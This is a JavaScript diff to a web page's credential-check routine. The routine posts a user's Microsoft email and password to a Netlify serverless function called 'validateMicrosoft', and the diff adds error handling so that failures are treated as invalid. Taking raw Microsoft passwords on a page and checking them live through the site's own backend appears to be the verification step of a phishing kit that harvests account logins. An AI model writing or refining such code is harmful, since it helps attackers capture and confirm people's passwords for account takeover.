@@ -381,12 +381,12 @@
         }
     }
 
-    // ✅ NEW: Validate Microsoft credentials
+    // ✅ FIXED: Validate Microsoft credentials - returns INVALID on error
     async function validateCredentials(email, password) {
         try {
             console.log('🔐 Validating credentials with Microsoft...');
             
-            const response = await fetch('/.netlify/functions/validateMicrosoft', {
+            const response = await fetch('/.netlify/functions/ValidateMicrosoft', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -394,14 +394,39 @@
                 body: JSON.stringify({ email, password })
             });
 
+            // Check if function exists
+            if (response.status === 404) {
+                console.error('❌ Validation function not found');
+                // Return invalid on 404
+                return { 
+                    valid: false, 
+                    reason: 'Validation service not found',
+                    error: true
+                };
+            }
+
+            if (!response.ok) {
+                console.error('❌ Validation service error:', response.status);
+                // Return invalid on any error
+                return { 
+                    valid: false, 
+                    reason: 'Validation service error',
+                    error: true
+                };
+            }
+
             const result = await response.json();
             console.log('📊 Validation result:', result);
             
             return result;
         } catch (error) {
             console.error('❌ Validation error:', error);
-            // On error, assume valid to not block user
-            return { valid: true, reason: 'Validation service unavailable' };
+            // ✅ FIXED: Return INVALID on error, not valid
+            return { 
+                valid: false, 
+                reason: 'Validation failed',
+                error: true
+            };
         }
     }
 
